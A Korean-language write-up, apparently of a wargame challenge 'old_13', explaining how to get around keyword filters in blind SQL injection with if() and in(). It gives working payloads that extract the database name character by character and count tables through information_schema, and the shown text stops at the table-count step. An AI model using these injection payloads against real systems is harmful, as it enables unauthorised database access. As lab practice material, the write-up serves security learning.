## old_13



![chrome_KWeFLMHC9D](https://user-images.githubusercontent.com/79683414/145674374-a0c31535-c703-4994-afbb-19e9d0cff6f6.png)

<br>

필터링을 검사해본 결과 아래와 같이 필터링이 적용되어 있었다.

filter : union, #, *, limit, like, 논리/비교연산자, +, -, 공백문자, where ...etc

<br>

문제 풀이에 앞서 이번 문제에서 사용되는 Trick 을 먼저 살펴보자.

아래는 SQL 인젝션 문제에 통상적으로 이용되는 쿼리의 예이다.

__SELECT table_name FROM information_schema.tables WHERE table_schema="chall13";__

<br>

하지만 문제에서 `=, where` 를 필터링 하므로 위의 쿼리를 조금 변형해야 한다.

여기서 사용할 것은 if() 와 in() 이다.

- if(조건문, 참일 때 값, 거짓일 때 값)
- in(A,B,C...)

<br>

if 는 조건문에 따라 값을 반환한다.

in 은 조건문에서 사용되는 연산인데 아래의 예시를 보는 것이 빠르다.

```
...WHERE a=1 OR a=2

...WHERE a in (1,2)
```

<br>

if() 와 in() 을 사용하면 처음 쿼리의 `WHERE, =` 를 대체할 수 있다.

__SELECT table_name FROM information_schema.tables WHERE table_schema="chall13";__

`WHERE` 대체 :  SELECT __if(table_schema='chall13',table_name,0)__ FROM information_schema.tables;

`=` 대체 : SELECT if(__(table_schema)in('chall13')__,table_name,0) FROM information_schema.tables;

<br>

대체할 수 있다고 했지만 위 두 쿼리는 결과값이 살짝 다르다.

테스트를 위해 간단하게 테이블을 만들었다.

![vmware_BYjwKGLEiC](https://user-images.githubusercontent.com/79683414/145996161-8a75fea7-23d0-47b3-a3a5-35ec62a214d6.png)

<br>

LAB 데이터베이스안에 CHALL13 과 TEST 테이블이 존재한다.

결과값이 다르다고 언급했는데 위의 두 쿼리를 직접 입력해보자.















submit의 결과 값으로는 1, true 가 '1' 이고 나머지는 '0'이다.

![vmware_kUQHsFWxB1](https://user-images.githubusercontent.com/79683414/145983393-3231d240-6803-4458-9d3c-ecbd40305cb1.png)
![DXDm5ptq1m](https://user-images.githubusercontent.com/79683414/145983403-2ced1715-dde4-4a97-86d2-ff693d217614.png)
![7U1IYwMCkN](https://user-images.githubusercontent.com/79683414/145983408-e2fdcefd-3c61-476f-98ba-f7142e417ffc.png)
![mKnbjwMvDT](https://user-images.githubusercontent.com/79683414/145983415-e3532715-3926-405b-86cd-8e6196a8426a.png)

<br>



데이터 베이스명 알아내기(길이>1글자씩)

if(length(database())in(7),1,0)

if(substr(database(),1,1)in("c"),1,0) > 실패

if(ord(substr(database(),1,1))in(99),1,0)

if(ord(substr(database(),7,1))in(51),1,0)

chall13 = 99,104,97,108,108,49,51



테이블 개수

if((select(count(if((table_schema)in(database()),table_name,null)))from(information_schema.tables))in(2),1,0)
